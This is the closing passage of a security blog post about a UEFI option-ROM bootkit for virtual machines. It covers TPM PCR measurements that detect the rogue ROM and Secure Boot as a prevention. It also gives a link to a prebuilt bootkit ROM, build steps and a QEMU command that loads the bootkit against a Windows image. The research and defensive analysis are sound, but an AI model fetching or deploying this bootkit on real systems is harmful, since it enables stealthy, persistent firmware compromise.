</span></span><span style="display:flex;"><span>qemu-system-x86_64 -bios ./Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>        -cdrom ~/Downloads/ISOs/kali-linux-2022.3-live-amd64.iso <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>        -m <span style="color:#ae81ff">2048</span> -device e1000e,romfile<span style="color:#f92672">=</span>myoptionrom.efirom -smp <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>        -enable-kvm -chardev socket,id<span style="color:#f92672">=</span>chrtpm,path<span style="color:#f92672">=</span>/tmp/emulated_tpm/swtpm-sock <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>        -tpmdev emulator,id<span style="color:#f92672">=</span>tpm0,chardev<span style="color:#f92672">=</span>chrtpm -device tpm-tis,tpmdev<span style="color:#f92672">=</span>tpm0
</span></span></code></pre></div><p>Inside the Linux VM, we can dump the TPM PCR registers and see that many of the registers look like they&rsquo;ve been populated properly.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  sha1:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> : 0x529244E7253C7C861D84FFA330565E0734F1465D
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span> : 0x9780BAFB6A32CD879C32BE2F87C6D2ED3C452C0A
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2</span> : 0x8D92BD051EBFD76995EA610815A232A2FD00565D
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">3</span> : 0xB2A83B0EBF2F8374299A5B2BDFC31EA955AD7236
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">4</span> : 0xBC919BAC17CE4CAF7B0F2CAE295CBCAD05F97CC6
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">5</span> : 0xD16D7E629FD8D08CA256F9AD3A3A1587C9E6CC1B
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">6</span> : 0xB2A83B0EBF2F8374299A5B2BDFC31EA955AD7236
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span> : 0x518BD167271FBB64589C61E43D8C0165861431D8
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8</span> : 0x0000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">9</span> : 0x0000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span>    10: 0x1BD9CA5FEBE32A74668411BF4750CAD7DC7AE360
</span></span><span style="display:flex;"><span>    11: 0x0000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span>    12: 0x0000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span>    13: 0x0000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span>    14: 0x0000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span>    15: 0x0000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span>    16: 0x0000000000000000000000000000000000000000
</span></span><span style="display:flex;"><span>    17: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span></span><span style="display:flex;"><span>    18: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span></span><span style="display:flex;"><span>    19: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span></span><span style="display:flex;"><span>    20: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span></span><span style="display:flex;"><span>    21: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span></span><span style="display:flex;"><span>    22: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
</span></span><span style="display:flex;"><span>    23: 0x0000000000000000000000000000000000000000
</span></span></code></pre></div><p>Rebooting the VM with the same settings and dumping the PCR registers generates the <em>same</em> result. <em>However</em>, when we remove the OpRom (<code>-device e1000e,romfile=myoptionrom.efirom</code> -&gt; <code>-device e1000e</code>), we can see PCR2 and PCR10 change!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ diff boot1.txt boot3_rommodified.txt 
</span></span><span style="display:flex;"><span>4c4
</span></span><span style="display:flex;"><span>&lt;     <span style="color:#ae81ff">2</span> : 0x8D92BD051EBFD76995EA610815A232A2FD00565D
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>&gt;     <span style="color:#ae81ff">2</span> : 0xF27878B4A11FF2E55D48FEE86E96034E7F8B41AC
</span></span><span style="display:flex;"><span>12c12
</span></span><span style="display:flex;"><span>&lt;     10: 0x1BD9CA5FEBE32A74668411BF4750CAD7DC7AE360
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>&gt;     10: 0xDBBBD3234F8820C5D909C31F21FA5849ABC759AA
</span></span></code></pre></div><p>PCR2 corresponds to the &ldquo;extended/pluggable executable code&rdquo; which makes sense because we have modified this by removing the OpRom on the system. Therefore, by checking PCR2 for changes one can determine if a new (and potentially malicious) OpRom has been added including our bootkit.</p>
<h4 id="prevention">Prevention</h4>
<p>Secure boot will prevent unsigned option ROMs from being loaded and would disable this bootkit. However, very few VMs enable secure boot as it is complicated to do and is not common to have the security requirements to do so as it is not a physical machine. Secure boot is disabled by default on VirtualBox/ESXi/KVM.</p>
<h2 id="code--demo">Code &amp; Demo</h2>
<h3 id="code">Code</h3>
<p><a href="https://github.com/gfoudree/UEFIBootkit">https://github.com/gfoudree/UEFIBootkit</a></p>
<h3 id="building">Building</h3>
<p>You can download the built OpRom if you don&rsquo;t feel like building it: <a href="https://github.com/gfoudree/UEFIBootkit/releases/download/0.0.1/bootkit_oprom.efirom">https://github.com/gfoudree/UEFIBootkit/releases/download/0.0.1/bootkit_oprom.efirom</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/gfoudree/UEFIBootkit
</span></span><span style="display:flex;"><span>docker build . -t bootkit
</span></span></code></pre></div><p>Then copy the OptionRomBootkit.efirom file out from the image to get the bootkit OpRom.</p>
<h3 id="running">Running</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qemu-system-x86_64 -bios ./Build/OvmfX64/DEBUG_GCC5/FV/OVMF.fd <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>  -m <span style="color:#ae81ff">1024</span> -device e1000e,romfile<span style="color:#f92672">=</span>OptionRomBootkit.efirom <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>  -enable-kvm -serial file:serial.log <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span>  -drive file<span style="color:#f92672">=</span>~/Downloads/win10.img -smp <span style="color:#ae81ff">2</span> -m <span style="color:#ae81ff">2048</span>
</span></span></code></pre></div><h3 id="demo">Demo</h3>
<p><img src="/calc_launch.webp" alt="calc.exe_launch"></p>

    </article>

    
    
    <div class="pagination" style="margin-top:3rem;">
      <a href="http://localhost:51372/post/rfid-hacking-proxmark/">← Proxmark3: Crack and Clone Apartment RFID Key Fob</a>
      <a href="http://localhost:51372/post/removing-intel-me-on-x1-carbon/">Removing Intel Management Engine From Lenovo X1 Carbon 6th Gen Laptop →</a>
    </div>
    
  </div>

</div>

  </main><footer class="site-footer">
  <div class="container">
    <div class="footer-left">
      <strong>x86sec</strong> — a cybersecurity blog<br>
      &copy; 2026 Grant Foudree
    </div>
    <div class="footer-links">
      <a href="https://github.com/gfoudree" rel="noopener">github</a>
    </div>
  </div>
</footer>
<script src="/js/main.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
</body>
</html>
